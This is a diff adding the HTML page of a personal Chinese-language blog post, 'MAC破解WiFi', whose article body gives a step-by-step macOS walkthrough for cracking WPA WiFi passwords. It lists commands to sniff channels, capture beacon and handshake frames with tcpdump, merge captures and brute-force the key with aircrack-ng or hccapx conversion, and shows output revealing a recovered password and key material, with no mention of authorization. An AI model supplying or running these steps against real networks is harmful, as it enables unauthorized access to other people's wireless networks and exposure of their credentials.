@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>MAC破解WiFi | Stay hungry, Stay foolish.</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1.安装airport1$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport 2.扫描周围的Wifi1$ sudo airport -s 3.嗅探指定的信道1$ sudo airport en0 sniff $C">
+<meta name="keywords" content="通用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MAC破解WiFi">
+<meta property="og:url" content="https://github.com/DavidWanderer/Blog/2020/03/15/MAC破解WiFi/index.html">
+<meta property="og:site_name" content="Stay hungry, Stay foolish.">
+<meta property="og:description" content="1.安装airport1$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport 2.扫描周围的Wifi1$ sudo airport -s 3.嗅探指定的信道1$ sudo airport en0 sniff $C">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-03-15T13:16:03.233Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MAC破解WiFi">
+<meta name="twitter:description" content="1.安装airport1$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport 2.扫描周围的Wifi1$ sudo airport -s 3.嗅探指定的信道1$ sudo airport en0 sniff $C">
+  
+    <link rel="alternate" href="/Blog/atom.xml" title="Stay hungry, Stay foolish." type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/Blog/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/Blog/" id="logo">Stay hungry, Stay foolish.</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/Blog/">Home</a>
+        
+          <a class="main-nav-link" href="/Blog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/Blog/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://github.com/DavidWanderer/Blog"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MAC破解WiFi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/Blog/2020/03/15/MAC破解WiFi/" class="article-date">
+  <time datetime="2020-03-15T13:07:19.000Z" itemprop="datePublished">2020-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MAC破解WiFi
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.安装airport<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport</span><br></pre></td></tr></table></figure></p>
+<p>2.扫描周围的Wifi<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo airport -s</span><br></pre></td></tr></table></figure></p>
+<p>3.嗅探指定的信道<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo airport en0 sniff <span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure></p>
+<p>如果出现错误，Segmentation fault: 11，可以使用 tcpdump 抓包<br>4.1 断开airport的连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo airport -z</span><br></pre></td></tr></table></figure></p>
+<p>4.2 设置信道，-c和信道号之间没有空格<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo airport -c6</span></span><br><span class="line">$ sudo airport -c<span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure></p>
+<p>4.3 从指定AP开始抓包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump "type mgt subtype beacon and ether src 98:13:33:b4:35:a4" -I -c 1 -i en0 -w beacon.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">"type mgt subtype beacon and ether src <span class="variable">$BSSID</span>"</span> -I -c 1 -i en0 -w beacon.cap</span><br></pre></td></tr></table></figure></p>
+<p>4.4 等待WPA的握手<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump "ether proto 0x888e and ether host 98:13:33:b4:35:a4" -I -U -vvv -i en0 -w handshake.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">"ether proto 0x888e and ether host <span class="variable">$BSSID</span>"</span> -I -U -vvv -i en0 -w handshake.cap</span><br></pre></td></tr></table></figure></p>
+<p>4.5 安装wireshark，下一步会用到它的合包命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install wireshark</span><br></pre></td></tr></table></figure></p>
+<p>4.6 将2个cap文件合并成一个cap文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap</span><br></pre></td></tr></table></figure></p>
+<p>至少要等到4.4获取到4 frames或更多的包才可以Ctrl-C终止抓包。</p>
+<p>4.7 安装 aircrack-ng<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install aircrack-ng</span><br></pre></td></tr></table></figure></p>
+<p>4.8 将 aircrack-ng 路径添加到 /etc/paths 中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/paths</span><br></pre></td></tr></table></figure></p>
+<p>然后将 aircrack-ng 路径添加到最后一行。</p>
+<p>4.9 查看抓到的包中是否包含握手包。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#$ aircrack-ng capture.cap</span></span><br><span class="line">Hu-YupingdeMacBook-Pro:wifi kris$ aircrack-ng capture.cap</span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:7D:24:D7:AF:DC  @PHICOMM_DA               WPA (0 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure></p>
+<ol start="5">
+<li><p>撞击密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng -w alphaDic.txt -b 98:13:33:B4:35:A4 capture1.cap</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>转换包格式,如果使用上面的cap无法爆破，或者爆破比较麻烦，可以将cap包转换成hcccapx格式，然后再破解。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./cap2hccapx.bin /Users/kris/Desktop/wifi/20200208/capture.cap /Users/kris/Desktop/wifi/20200208/capture.hccapx</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>下面是一个破解示例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:03:20] 2018576/13516904 keys tested (10197.95 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 18 minutes, 47 seconds                         14.93%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ 19731009qiu ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : A8 36 07 C4 68 42 71 E0 B9 38 6E 16 B7 1B 7A 77 </span><br><span class="line">                       DA 07 E9 A1 82 CE 95 56 22 C2 76 16 93 B1 8E 9B </span><br><span class="line"></span><br><span class="line">      Transient Key  : 34 83 20 8E B0 2E F2 11 FF 5B 68 A4 A3 16 94 FE </span><br><span class="line">                       74 28 4D D9 99 BA 10 38 F4 20 6D 14 D1 47 89 C9 </span><br><span class="line">                       22 75 EB B5 29 FD CF 9B 01 32 38 B7 51 10 94 88 </span><br><span class="line">                       90 4D 52 D5 88 E4 B1 58 DA 2D DC 35 5F 61 88 92 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : F6 4D 5F 02 77 F9 96 8A F4 E3 C7 8C DA E4 C6 E0</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://github.com/DavidWanderer/Blog/2020/03/15/MAC破解WiFi/" data-id="ck7t2e8o20000v33midalt7na" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/Blog/tags/通用/">通用</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/Blog/2020/03/15/Vue-CLI安装报错/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Vue CLI安装报错</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/FTP/">FTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/Ruby/">Ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/VPS/">VPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/iOS/">iOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/Blog/tags/通用/">通用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/Blog/tags/FTP/" style="font-size: 10px;">FTP</a> <a href="/Blog/tags/Git/" style="font-size: 10px;">Git</a> <a href="/Blog/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/Blog/tags/Python/" style="font-size: 17.5px;">Python</a> <a href="/Blog/tags/Ruby/" style="font-size: 10px;">Ruby</a> <a href="/Blog/tags/VPS/" style="font-size: 12.5px;">VPS</a> <a href="/Blog/tags/iOS/" style="font-size: 20px;">iOS</a> <a href="/Blog/tags/前端/" style="font-size: 10px;">前端</a> <a href="/Blog/tags/通用/" style="font-size: 15px;">通用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/Blog/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/Blog/2020/03/15/MAC破解WiFi/">MAC破解WiFi</a>
+          </li>
+        
+          <li>
+            <a href="/Blog/2020/03/15/Vue-CLI安装报错/">Vue CLI安装报错</a>
+          </li>
+        
+          <li>
+            <a href="/Blog/2020/02/19/iOS创建Framwork工程步骤/">iOS创建Framwork工程步骤</a>
+          </li>
+        
+          <li>
+            <a href="/Blog/2020/01/31/GCD概要/">GCD概要</a>
+          </li>
+        
+          <li>
+            <a href="/Blog/2020/01/27/查看autoreleasepool的状态/">查看autoreleasepool的状态</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 WandererPoet<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/Blog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/Blog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/Blog/fancybox/jquery.fancybox.css">
+  <script src="/Blog/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/Blog/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
